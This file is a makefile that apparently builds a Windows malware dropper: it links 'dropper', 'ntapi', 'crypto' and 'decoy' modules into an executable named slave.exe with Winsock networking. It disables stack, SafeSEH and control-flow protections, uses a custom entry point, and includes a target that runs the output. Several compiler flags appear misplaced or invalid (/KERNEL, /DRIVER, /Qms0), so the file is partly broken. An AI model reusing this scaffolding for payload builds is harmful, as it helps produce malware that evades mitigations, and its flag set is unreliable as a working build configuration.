CLFL_BUILD_release = /DRELEASE
CLFL_BUILD_debug   = /Z7 /DDEBUG /DDEBUG_LEVEL=3 /DDEBUG_C_ASSERT

CLFL_INCLUDE = /I$(PROJECT_INCLUDE_PATH)/ /FI$(PROJECT_INCLUDE_PATH)/stdafx.h
CLFL_BASE    = /Wall $(CLFL_INCLUDE) $(CLFL_BUILD_$(PROJECT_BUILD)) /J /Gr /GS:off /Qms0 /Qsafeseh- /Qcf-protection:none /Qfreestanding /KERNEL /DRIVER /LARGEADDRESSAWARE /DYNAMICBASE /NODEFAULTLIB
CLFL_CPU     = /arch:SSE2 /tune:generic /Qopt-prefetch /Qopt-prefetch:2
CLFL_OX      = /Qipo /Os /Ob2 /GF /GA /Zp16 /Qunroll8 /Qsfalign16 /Qfnalign8
CCX64        = $(ICPP_COMPILER_X64)/icl.exe /nologo
CCX86        = $(ICPP_COMPILER_X86)/icl.exe /nologo

LDFL_BUILD_release = /RELEASE
LDFL_BUILD_debug   = /DEBUG DlgClient3.0.lib

LDFL_LIBS = /LIBPATH:"C:/Program Files (x86)/IntelSWTools/compilers_and_libraries_2019.2.190/windows/compiler/lib/ia32/" /LIBPATH:"C:/Program Files (x86)/Microsoft Visual Studio/2019/Enterprise/VC/Tools/MSVC/14.20.27508/lib/x86"
LDFL      = /MACHINE:X86 /MANIFEST:NO /DYNAMICBASE /SUBSYSTEM:WINDOWS /GUARD:NO /SAFESEH:NO /OPT:REF /ENTRY:InitialEntry $(LDFL_BUILD_$(PROJECT_BUILD)) KERNEL32.LIB WS2_32.LIB
LDX64     = @"$(ICPP_COMPILER_X64)/xilink.exe" /NOLOGO /TIME /LIBPATH:"$(LIB_ICPP_X64)" /LIBPATH:"$(LIB_VCTOOLS_X64)" /LIBPATH:"$(LIB_UNMANAGED_X64)" /LIBPATH:"$(PROJECT_LIB_PATH)/x64"
LDX86     = @"$(ICPP_COMPILER_X86)/xilink.exe" /NOLOGO /TIME /LIBPATH:"$(LIB_ICPP_X86)" /LIBPATH:"$(LIB_VCTOOLS_X86)" /LIBPATH:"$(LIB_UNMANAGED_X86)" /LIBPATH:"$(PROJECT_LIB_PATH)/x86"

# 1   path
# 2   module name
# 3   makefile rule
# 4   additional define
define CompileModule
	$(info # Compiling "$(2)")
	@make -s -j --no-print-directory -C $(1)$(2) -f Makefile $(3) CLFL_ADDON="$(4)" CC="$(CCX86)" CLFL_BASE="$(CLFL_BASE) /I$(PROJECT_INCLUDE_PATH)/$(2)" CLFL_CPU="$(CLFL_CPU)" CLFL_OX="$(CLFL_OX)"
endef

all: dropper decoy link r


link:
	$(LDX86) /NOLOGO /TIME $(LDFL) /MAP:$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/slave.map /PDB:$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/slave.pdb /OUT:$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/slave.exe \
	$(PROJECT_OBJECT_PATH)/dropper/*.obj \
	$(PROJECT_OBJECT_PATH)/dropper/ntapi/*.obj \
	$(PROJECT_OBJECT_PATH)/dropper/crypto/*.obj \
	$(PROJECT_OBJECT_PATH)/decoy/*.obj

r:
	cmd /c "$(PROJECT_BIN_PATH)/$(PROJECT_BUILD)/Slave.exe"

# x86 modules
c: dropper

dropper:
	$(call CompileModule,source/source/,dropper,,)

decoy:
	$(call CompileModule,source/source/,decoy,,)

# x64 modules
